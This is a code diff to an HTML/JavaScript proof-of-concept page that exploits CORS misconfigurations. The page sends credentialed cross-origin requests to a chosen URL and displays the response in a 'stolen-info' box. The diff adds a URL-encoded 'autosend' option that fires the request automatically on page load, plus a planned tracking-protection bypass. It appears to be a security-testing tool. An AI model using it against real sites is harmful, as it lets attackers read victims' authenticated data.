@@ -19,10 +19,12 @@ This is a PoC to demonstrate a CORS misconfiguration vulnerability on <code id="
 <pre>
 <form id="settings" name="settings">
 URL: <input type="text" placeholder="https://example.com" name="url" size="100"><br />
-Custom content type (optional): <input type="text" placeholder="text/plain" name="contenttype" size="100"><br />
-<input type="checkbox" name="authenticated"/> Send CORS with authentication cookies<br />
+Custom content type (optional): <input type="text" placeholder="text/plain" name="contenttype" size="50"><br />
+<input type="checkbox" name="authenticated"/> Send authentication cookies (<code>withCredentials</code>)<br />
 <input type="checkbox" name="postreq"/> POST request<br />
-Post data: <input type="text" placeholder="test=demo" name="postdata" size="100"><br />
+Post data: <input id="postdata" type="text" placeholder="test=demo" name="postdata" size="100"><br />
+<input type="checkbox" name="autosend"/> Autosend payload<br />
+<input type="checkbox" name="open_page" disabled="disabled"/> Open target page to bypass tracking protection (<a href="https://swarm.ptsecurity.com/bypassing-browser-tracking-protection-for-cors-misconfiguration-abuse/#:~:text=Bypassing%20tracking%20protection">source</a>) (todo)<br />
 <button id="btn-send" class="btn btn-info">Send CORS request</button>
 </form>
 </pre>
@@ -49,8 +51,23 @@ function parseConfig() {
   document.forms.settings.contenttype.value = config.contenttype;
   document.forms.settings.authenticated.checked = config.authenticated ? "checked" : "";
   document.forms.settings.postreq.checked = config.post ? "checked" : "";
+  document.forms.settings.autosend.checked = config.autosend ? "checked" : "";
+  // disable form data if post is not checked
+  document.forms.settings.postdata.disabled = config.post ? "" : "disabled";
+  // disable btn_send if autosend is enabled
+  document.getElementById("btn-send").disabled = config.autosend ? "disabled" : "";
+  document.forms.settings.open_page.checked = config.open_page ? "checked" : "";
+
   url = new URL(config.url);
   document.getElementById("url").textContent = url.hostname;
+
+  // if autosend is enabled, send the request
+  if(config.autosend) {
+    // add a delay to the request
+    setTimeout(function() {
+      sendCORS();
+    }, 500);
+  }
  } catch(e) {
   console.log(e);
  }
@@ -66,31 +83,53 @@ function saveConfig() {
    'contenttype': document.forms.settings.contenttype.value,
    'postdata': document.forms.settings.postdata.value,
    'authenticated': document.forms.settings.authenticated.checked,
-   'post': document.forms.settings.postreq.checked
+   'post': document.forms.settings.postreq.checked,
+   'autosend': document.forms.settings.autosend.checked,
+   'open_page': document.forms.settings.open_page.checked
   }
   history.replaceState(undefined, undefined, '#'+btoa(JSON.stringify(config)));
   parseConfig();
 }
 
 function sendCORS(e) {
-  e.preventDefault()
-  var xhttp = new XMLHttpRequest();
-  xhttp.onreadystatechange = function() {
-    if (this.readyState == 4 && this.status == 200) {
-      document.getElementById("stolen-info").innerHTML = htmlEntities(this.responseText);
+  // clear previous messages
+  document.getElementById("stolen-info").innerHTML = "<div class='spinner-border' role='status'><span class='sr-only'>Loading...</span></div>";
+  document.getElementById("stolen-info").classList.add("alert-info");
+  document.getElementById("stolen-info").classList.remove("alert-danger");
+  if(e) e.preventDefault()
+  try {
+    var xhttp = new XMLHttpRequest();
+    xhttp.onreadystatechange = function() {
+      if (this.readyState == 4 && this.status == 200) {
+        document.getElementById("stolen-info").innerHTML = htmlEntities(this.responseText);
+      } else if (this.readyState == 4) {
+        document.getElementById("stolen-info").classList.remove("alert-info");
+        document.getElementById("stolen-info").classList.add("alert-danger");
+        document.getElementById("stolen-info").innerHTML = (this.statusText.length>0 ? htmlEntities(this.statusText) : "(see console for details)");
+      }
+    };
+    var method = config.post ? "POST" : "GET";
+    xhttp.open(method, url, true);
+    if(config.contenttype) {
+    xhttp.setRequestHeader('Content-type', config.contenttype);
     }
-  };
-  var method = config.post ? "POST" : "GET";
-  xhttp.open(method, url, true);
-  if(config.contenttype) {
-  xhttp.setRequestHeader('Content-type', config.contenttype);
+    xhttp.withCredentials = config.authenticated;
+    if (method === "GET") xhttp.send();
+    if (method === "POST") xhttp.send(config.postdata);
+    return false;
+  } catch(e) {
+    document.getElementById("stolen-info").innerHTML = "Error: <div class='alert alert-danger'>"+htmlEntities(e)+"</div>";
+    return false;
   }
-  xhttp.withCredentials = config.authenticated;
-  if (method === "GET") xhttp.send();
-  if (method === "POST") xhttp.send(config.postdata);
-  return false;
+  
 }
-
+// add a debouncer to the post data field
+document.getElementById('postdata').addEventListener('input', function() {
+  clearTimeout(this.timer);
+  this.timer = setTimeout(function() {
+    saveConfig();
+  }, 1000);
+});
 document.getElementById('settings').addEventListener('change', saveConfig);
 document.getElementById('btn-send').addEventListener('click', sendCORS);
 parseConfig();
